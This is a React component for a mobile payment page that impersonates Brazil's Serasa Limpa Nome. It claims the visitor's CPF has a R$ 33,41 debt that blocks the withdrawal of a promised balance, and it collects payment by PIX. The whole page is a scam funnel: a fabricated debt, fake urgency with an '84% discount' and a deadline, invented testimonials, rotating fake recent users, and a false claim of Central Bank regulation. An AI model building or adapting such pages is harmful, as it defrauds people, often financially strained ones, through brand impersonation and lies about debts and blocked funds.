import { useState, useEffect } from "react";
import { Check, Loader2, Shield, ChevronRight, AlertCircle } from "lucide-react";
import serasaBanner from "@/assets/serasa-limpa-nome.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellTransacionalProps { balance: string; pixName: string; pixKey: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }

const FunnelUpsellTransacional = ({ balance, pixName, pixKey, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellTransacionalProps) => {
  const [recentUser, setRecentUser] = useState("");
  const recentNames = ["Juliana A.", "Pedro S.", "Mariana C.", "Diego L.", "Tatiana B.", "Felipe R.", "Aline M.", "Gustavo H.", "Sandra P.", "Thiago F."];
  useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 11000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-[#F5F0F6] overflow-y-auto">
      <div className="bg-[#ED1164] pt-3 pb-4 px-4"><div className="flex items-center justify-center mb-4"><img src={serasaBanner} alt="Serasa Limpa Nome" className="h-20 object-contain" /></div></div>
      <main className="px-4 -mt-6 space-y-3 max-w-md mx-auto pb-8">
        <div className="bg-white rounded-2xl p-4 shadow-sm">
          <h2 className="text-gray-900 text-base font-bold mb-2">{leadCpf ? `CPF ${leadCpf} possui pendência no Serasa` : "Seu CPF possui uma pendência no Serasa"}</h2>
          <p className="text-gray-500 text-sm leading-relaxed mb-3">O sistema identificou que {leadCpf ? <><strong className="text-gray-700">o CPF {leadCpf}</strong></> : <>seu CPF</>} possui um <strong className="text-gray-700">débito pendente de R$ 33,41</strong> registrado no Serasa. Enquanto essa pendência não for quitada, <strong className="text-gray-700">nenhuma transferência acima de R$ 1.000 pode ser processada</strong> para sua conta.</p>
          <div className="bg-red-50 border border-red-100 rounded-xl p-3 mb-3">
            <p className="text-red-700 text-xs font-bold mb-1">⚠️ Consequências do CPF negativado:</p>
            <ul className="space-y-1">
              <li className="text-red-600 text-xs flex items-start gap-1.5"><span className="mt-0.5">•</span>Saques e transferências PIX bloqueados</li>
              <li className="text-red-600 text-xs flex items-start gap-1.5"><span className="mt-0.5">•</span>Score de crédito comprometido</li>
              <li className="text-red-600 text-xs flex items-start gap-1.5"><span className="mt-0.5">•</span>Restrições em bancos e instituições financeiras</li>
            </ul>
          </div>
          <p className="text-gray-500 text-xs font-semibold mb-2">Ao quitar agora, você garante:</p>
          <div className="space-y-2 mb-3">
            {["Remoção imediata da restrição no Serasa", "Liberação do saque de " + balance + " em minutos", "CPF limpo em todas as consultas de crédito", "Comprovante de quitação emitido na hora"].map((item, i) => (
              <div key={i} className="flex items-center gap-2.5 bg-[#FDE8F0] rounded-lg px-3 py-2"><div className="w-5 h-5 rounded-full bg-[#ED1164] flex items-center justify-center shrink-0"><Check className="w-3 h-3 text-white" /></div><span className="text-gray-700 text-xs">{item}</span></div>
            ))}
          </div>
          <p className="text-gray-400 text-xs leading-relaxed">A quitação é processada instantaneamente. Após o pagamento, seu CPF é liberado e o saque é processado automaticamente.</p>
        </div>
        <div className="bg-white rounded-2xl p-4 shadow-sm">
          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Valor da quitação</span><span className="bg-[#FDE8F0] text-[#ED1164] text-[10px] font-bold px-2 py-0.5 rounded-full">-84%</span></div>
          <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">R$ 159,90</span><span className="text-gray-900 text-2xl font-extrabold">R$ 33,41</span></div>
          <p className="text-green-600 text-[11px] font-medium mb-4">Quitação instantânea + saque liberado na hora</p>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-[#ED1164] text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-pink-200">
            {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>Quitar Serasa e liberar saque<ChevronRight className="w-4 h-4" /></>)}
          </button>
          <div className="flex items-center justify-center gap-1.5 mt-3"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX</span></div>
        </div>
        <div className="bg-white rounded-2xl p-4 shadow-sm border-l-4 border-[#ED1164]">
          <div className="flex items-start gap-2.5"><AlertCircle className="w-5 h-5 text-[#ED1164] shrink-0 mt-0.5" /><div><p className="text-gray-800 text-xs font-bold mb-0.5">Oferta de quitação com prazo limitado</p><p className="text-gray-500 text-[11px] leading-relaxed">O desconto de 84% na quitação é válido apenas agora. Se não quitar dentro do prazo, o débito volta ao valor original de R$ 159,90 e o saque de <strong>{balance}</strong> permanece bloqueado.</p></div></div>
        </div>
        <div className="bg-white rounded-2xl p-4 shadow-sm">
          <p className="text-gray-900 font-bold text-sm mb-3">Quem quitou, já sacou</p>
          <div className="space-y-3">
            {[{ img: testimonial1, name: "Fernanda G.", amount: "R$ 2.741", text: "Quitei o Serasa e em 3 minutos o saque inteiro caiu na minha conta. CPF limpo!" }, { img: testimonial2, name: "Marcos V.", amount: "R$ 3.102", text: "Estava negativado e não conseguia sacar. Quitei e recebi tudo em 5 minutos." }, { img: testimonial3, name: "Bruno S.", amount: "R$ 2.834", text: "Paguei R$ 26 pra quitar e recebi quase R$ 3.000 de saque. Valeu demais." }].map((t, i) => (
              <div key={i}>{i > 0 && <div className="border-t border-gray-50" />}<div className="flex items-start gap-3"><img src={t.img} alt="" className="w-9 h-9 rounded-full object-cover shrink-0" /><div className="flex-1"><div className="flex items-center justify-between"><p className="text-gray-800 text-xs font-semibold">{t.name}</p><span className="text-green-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[11px] leading-relaxed mt-0.5">"{t.text}"</p></div></div></div>
            ))}
          </div>
        </div>
        <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-[#ED1164] text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-pink-200">
          {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>Quitar e liberar saque<ChevronRight className="w-4 h-4" /></>)}
        </button>
        <p className="text-gray-400 text-[10px] text-center pb-2">Regulamentado pelo Banco Central do Brasil</p>
      </main>
    </div>
  );
};

export default FunnelUpsellTransacional;
